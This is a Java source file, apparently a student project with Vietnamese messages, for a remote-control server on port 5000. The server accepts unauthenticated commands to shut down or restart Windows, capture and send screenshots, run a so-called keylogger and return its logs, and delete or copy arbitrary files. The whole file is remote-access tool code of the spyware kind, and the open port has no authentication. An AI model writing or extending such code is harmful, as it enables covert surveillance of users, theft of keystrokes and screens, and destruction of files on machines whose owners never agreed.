import java.awt.*;
import java.awt.event.*;
import java.io.*;
import java.net.*;
import java.nio.file.*;
import javax.imageio.ImageIO;
import java.util.*;
import java.util.concurrent.*;
import java.util.ArrayList ;
import java.util.List ;
import java.awt.image.BufferedImage;

public class RemoteServer {
    private static boolean isKeyloggerEnabled = false;
    private static ExecutorService executorService = Executors.newCachedThreadPool();
    private static List<String> keyPresses = new ArrayList<>();
    private static Robot robot; 

    public static void main(String[] args) {
        try {
            ServerSocket serverSocket = new ServerSocket(5000);
            System.out.println("Server da khoi dong. Dang cho ket noi tu client...");
            while (true) {
                Socket socket = serverSocket.accept();
                System.out.println("Client da ket noi: " + socket.getInetAddress().getHostAddress());

                executorService.submit(() -> handleClientRequest(socket));
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    // Hàm xử lý các yêu cầu từ client
    public static void handleClientRequest(Socket socket) {
        try (BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
             PrintWriter writer = new PrintWriter(socket.getOutputStream(), true)) {

            while (true) {
                String request = reader.readLine();
                System.out.println("Nhan duoc yeu cau: " + request);

                if (request == null) {
                    break; // 
                }

                switch (request) {
                    case "shutdown":
                        // Tắt hệ thống sau 1 giờ
                        Runtime.getRuntime().exec("shutdown -s -t 3600");
                        writer.println("He thong se tat trong 1 gio...");
                        break;

                    case "restart":
                        // Khởi động lại hệ thống
                        Runtime.getRuntime().exec("shutdown -r -t 0");
                        writer.println("He thong dang khoi dong lai...");
                        break;

                    case "cancel":
                        // Hủy tắt hệ thống
                        Runtime.getRuntime().exec("shutdown -a");
                        writer.println("Da huy tat he thong.");
                        break;

                    case "screenshot":
                        // Chụp ảnh màn hình
                        captureScreenshot(writer, socket);
                        break;

                    case "keylogger":
                        // Bật/tắt keylogger
                        toggleKeylogger(writer);
                        break;

                    case "getKeyLogs":
                       
                        sendKeyLogs(writer);
                        break;

                    case "deleteFile":
                       
                        String filePath = reader.readLine();
                        deleteFile(filePath, writer);
                        break;

                    case "copyFile":
                       
                        String sourcePath = reader.readLine();
                        String destPath = reader.readLine();
                        copyFile(sourcePath, destPath, writer);
                        break;

                    default:
                        writer.println("Lenh khong hop le: " + request);
                        break;
                }
            }
        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            try {
                socket.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    
    private static void toggleKeylogger(PrintWriter writer) {
        if (isKeyloggerEnabled) {
           
            isKeyloggerEnabled = false;
            writer.println("Keylogger da dung");
        } else {
            
            try {
                isKeyloggerEnabled = true;
                startKeylogger();
                writer.println("Keylogger da bat");
            } catch (AWTException e) {
                writer.println("Khong the bat keylogger: " + e.getMessage());
            }
        }
    }

   
    private static void startKeylogger() throws AWTException {
        if (robot == null) {
            robot = new Robot();  
        }

        
        Toolkit.getDefaultToolkit().addAWTEventListener(event -> {
            if (event instanceof KeyEvent) {
                KeyEvent kevent = (KeyEvent) event;
                if (kevent.getID() == KeyEvent.KEY_PRESSED) {
                    String key = KeyEvent.getKeyText(kevent.getKeyCode());
                    System.out.println("Phim da nhan: " + key);
                    keyPresses.add(key);  
                }
            }
        }, AWTEvent.KEY_EVENT_MASK);
    }

   
    private static void sendKeyLogs(PrintWriter writer) {
        StringBuilder logs = new StringBuilder();
        for (String key : keyPresses) {
            logs.append(key).append("\n");
        }
        writer.println(logs.toString());
    }

  
    private static void deleteFile(String path, PrintWriter writer) {
        try {
            Path filePath = Paths.get(path);
            Files.deleteIfExists(filePath);
            writer.println("Da xoa file: " + path);
        } catch (IOException e) {
            e.printStackTrace();
            writer.println("Khong xoa duoc file: " + path);
        }
    }

   
    private static void copyFile(String source, String destination, PrintWriter writer) {
        try {
            Path sourcePath = Paths.get(source);
            Path destPath = Paths.get(destination);
            Files.copy(sourcePath, destPath, StandardCopyOption.REPLACE_EXISTING);
            writer.println("Da sao chep file tu " + source + " den " + destination);
        } catch (IOException e) {
            e.printStackTrace();
            writer.println("Khong sao chep duoc file: " + source);
        }
    }

    
    private static void captureScreenshot(PrintWriter writer, Socket socket) {
        try {
            BufferedImage screenshot = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ImageIO.write(screenshot, "png", baos);
            byte[] imageBytes = baos.toByteArray();
            baos.close();

            writer.println(imageBytes.length); 
            socket.getOutputStream().write(imageBytes); 
            socket.getOutputStream().flush();
            writer.println("Da chup anh man hinh");
        } catch (AWTException | IOException e) {
            e.printStackTrace();
            writer.println("Khong the chup anh man hinh");
        }
    }
}
